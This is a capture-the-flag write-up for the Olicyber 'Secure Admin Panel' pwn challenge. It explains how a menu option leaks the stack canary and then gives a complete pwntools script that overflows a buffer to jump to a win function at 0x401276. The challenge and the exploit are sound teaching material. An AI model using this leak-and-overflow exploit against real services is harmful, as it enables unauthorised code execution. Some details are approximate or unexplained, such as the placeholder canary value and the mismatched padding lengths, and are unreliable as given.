---
title: "Secure Admin Panel — Stack Canary Leak + ret2win"
date: 2026-02-28
categories: ["Olicyber"]
series: ["Territoriale 2026 Demo"]
tags: ["pwn", "stack-canary", "ret2win", "buffer-overflow", "pwntools"]
difficulty: "intermediate"
summary: "Leak the stack canary via a controlled print function, then overflow to overwrite the return address without triggering the canary check."
---

## The Challenge

`secureadminpanel` is an x86-64 ELF. `checksec` confirms: NX enabled, stack canary present, no PIE. The binary presents a menu:

- Option 1: store your name (reads into a buffer)
- Option 2: print a "Regalino" — this leaks the stack canary as a hex value
- Option 3: read another input into a buffer with a classic stack overflow

The win function lives at `0x401276`.

## Approach

First thing was `checksec`: canary is there, NX on, no PIE. The canary means I can't just overflow blindly — the stack check will kill the process before it ever returns to my payload.

I went straight to option 3 and tried a basic overflow to see what happened: segfault, then `*** stack smashing detected ***`. Canary triggered. So the canary has to come first.

I looked at all three menu options more carefully. Option 1 takes a name. Option 2 prints a "Regalino" value. I tested option 2 without setting any name first — it printed something that looked like a hex number, `0xf1234567890abcde` or similar. I set a name with option 1 (padding to reach the canary position) and called option 2 again — this time it printed the actual canary. The binary is literally leaking it through the Regalino feature.

With the canary in hand, the overflow in option 3 is straightforward: 24 bytes of junk to reach the canary position, then the canary itself, then 8 bytes for saved RBP, then the win function address `0x401276`.

## Solution

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'secureadminpanel')

host = args.HOST or 'sadmin.challs.olicyber.it'
port = int(args.PORT or 38700)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()
io.sendlineafter(b"Choice: ", b"1")
payload = b'A' * 32 + p32(0x41424344)*4
io.sendafter(b"Enter your name: ", payload)
io.sendlineafter(b"Choice: ", b"2")
io.recvuntil(b"Regalino: ")
canary = int(io.recvline().strip(), 16)
io.recv(100)
io.sendline(b'3')
io.recv(100)
io.sendline(b'A'*24 + p64(canary) + b'a'*8 + p64(0x401276))

io.interactive()
```

The `24` byte offset and the exact position of the canary in the payload depend on the specific stack frame layout, which I confirmed by examining the disassembly of the vulnerable function. The win function at `0x401276` prints the flag or spawns a shell — either way, `interactive()` catches it.

## What I Learned

A canary leak doesn't require a format string bug or memory corruption — here the binary literally prints it for you (framed as a feature). Once you have the canary value, the overflow is textbook: pad to the canary, preserve it, overwrite the return address. No PIE means the win address never changes.
